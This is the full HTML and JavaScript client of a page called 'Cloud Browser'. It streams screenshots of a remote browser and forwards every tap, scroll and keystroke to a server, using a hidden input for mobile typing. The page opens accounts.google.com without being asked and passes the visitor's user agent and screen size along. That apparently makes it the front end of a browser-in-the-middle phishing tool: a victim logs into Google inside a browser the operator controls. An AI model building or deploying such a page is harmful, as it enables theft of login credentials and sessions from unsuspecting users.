<!DOCTYPE html>
<html>
<head>
  <title>Cloud Browser</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      width: 100vw;
      height: 100vh;
      background: #000;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }
    #toolbar {
      width: 100%;
      background: #1a1a1a;
      padding: 6px 8px;
      display: flex;
      gap: 6px;
      align-items: center;
      height: 44px;
      flex-shrink: 0;
    }
    #urlbar {
      flex: 1; padding: 5px 10px;
      border-radius: 20px; border: none;
      background: #333; color: white; font-size: 13px;
    }
    #goBtn {
      padding: 5px 14px; border-radius: 20px;
      background: #4CAF50; color: white;
      border: none; font-size: 13px;
    }
    #status {
      color: #aaa; font-size: 11px;
      text-align: center; padding: 2px;
      background: #111; flex-shrink: 0;
    }
    #wrapper {
      flex: 1; position: relative;
      overflow: hidden; width: 100%;
    }
    #screen {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      touch-action: none;
    }
    #hiddenInput {
      position: fixed;
      left: -9999px;
      top: 50%;
      font-size: 16px;
      opacity: 0;
    }
  </style>
</head>
<body>
  <div id="toolbar">
    <input id="urlbar" type="text" value="https://accounts.google.com" />
    <button id="goBtn">Go</button>
  </div>
  <div id="status">Starting...</div>
  <div id="wrapper">
    <canvas id="screen"></canvas>
  </div>
  <input id="hiddenInput" type="text" autocomplete="off" />

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const canvas = document.getElementById('screen')
    const ctx = canvas.getContext('2d')
    const status = document.getElementById('status')
    const urlbar = document.getElementById('urlbar')
    const hiddenInput = document.getElementById('hiddenInput')
    const socket = io()
    let sessionId = null

    // Start session
    async function startSession(url) {
      status.textContent = 'Starting...'
      try {
        const res = await fetch('/api/session', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            url: url || 'https://accounts.google.com',
            userAgent: navigator.userAgent,
            width: window.screen.width,
            height: window.screen.height
          })
        })
        const data = await res.json()
        if (data.error) { status.textContent = 'Error: ' + data.error; return }
        sessionId = data.sessionId
        status.textContent = 'Live ✓'
        socket.emit('join', sessionId)
      } catch (err) {
        status.textContent = 'Failed: ' + err.message
      }
    }

    // Render frames
    socket.on('frame', (base64) => {
      const img = new Image()
      img.onload = () => {
        canvas.width = img.naturalWidth
        canvas.height = img.naturalHeight
        ctx.drawImage(img, 0, 0)
      }
      img.src = 'data:image/jpeg;base64,' + base64
    })

    socket.on('url', (url) => { urlbar.value = url })
    socket.on('error', (msg) => { status.textContent = 'Error: ' + msg })

    // Convert coordinates
    function toCanvasCoords(clientX, clientY) {
      const rect = canvas.getBoundingClientRect()
      const x = (clientX - rect.left) / rect.width * canvas.width
      const y = (clientY - rect.top) / rect.height * canvas.height
      return { x, y }
    }

    // Touch events
    let touchStartX = 0
    let touchStartY = 0
    let touchStartTime = 0
    let lastScrollY = 0
    let didScroll = false

    canvas.addEventListener('touchstart', (e) => {
      e.preventDefault()
      const t = e.touches[0]
      touchStartX = t.clientX
      touchStartY = t.clientY
      lastScrollY = t.clientY
      touchStartTime = Date.now()
      didScroll = false
    }, { passive: false })

    canvas.addEventListener('touchmove', (e) => {
      e.preventDefault()
      didScroll = true
      const t = e.touches[0]
      const delta = (lastScrollY - t.clientY) * 2
      lastScrollY = t.clientY
      socket.emit('input', { type: 'scroll', delta })
    }, { passive: false })

    canvas.addEventListener('touchend', (e) => {
      e.preventDefault()
      if (didScroll) return

      const t = e.changedTouches[0]
      const dx = Math.abs(t.clientX - touchStartX)
      const dy = Math.abs(t.clientY - touchStartY)
      const dt = Date.now() - touchStartTime

      if (dt < 300 && dx < 20 && dy < 20) {
        const { x, y } = toCanvasCoords(touchStartX, touchStartY)
        socket.emit('input', { type: 'tap', x, y })
        status.textContent = `Tap: ${Math.round(x)}, ${Math.round(y)}`

        // Focus hidden input for keyboard
        setTimeout(() => hiddenInput.focus(), 100)
      }
    }, { passive: false })

    // Hidden input for keyboard
    let lastVal = ''
    hiddenInput.addEventListener('input', () => {
      const val = hiddenInput.value
      if (val.length > lastVal.length) {
        const newChar = val.slice(lastVal.length)
        socket.emit('input', { type: 'type', text: newChar })
      }
      lastVal = val
    })

    hiddenInput.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace') {
        socket.emit('input', { type: 'key', key: 'Backspace' })
        lastVal = hiddenInput.value.slice(0, -1)
      }
      if (e.key === 'Enter') {
        socket.emit('input', { type: 'key', key: 'Enter' })
        hiddenInput.value = ''
        lastVal = ''
      }
    })

    // Desktop keyboard
    document.addEventListener('keydown', (e) => {
      if (e.target === urlbar || e.target === hiddenInput) return
      if (e.key.length === 1) socket.emit('input', { type: 'type', text: e.key })
      else socket.emit('input', { type: 'key', key: e.key })
    })

    // Desktop click
    canvas.addEventListener('click', (e) => {
      if (navigator.maxTouchPoints > 0) return
      const { x, y } = toCanvasCoords(e.clientX, e.clientY)
      socket.emit('input', { type: 'tap', x, y })
    })

    canvas.addEventListener('wheel', (e) => {
      e.preventDefault()
      socket.emit('input', { type: 'scroll', delta: e.deltaY })
    }, { passive: false })

    // Go button
    document.getElementById('goBtn').addEventListener('click', () => {
      if (sessionId) socket.emit('input', { type: 'navigate', url: urlbar.value })
      else startSession(urlbar.value)
    })

    urlbar.addEventListener('keydown', (e) => {
      if (e.key !== 'Enter') return
      if (sessionId) socket.emit('input', { type: 'navigate', url: urlbar.value })
      else startSession(urlbar.value)
    })

    startSession('https://accounts.google.com')
  </script>
</body>
</html>
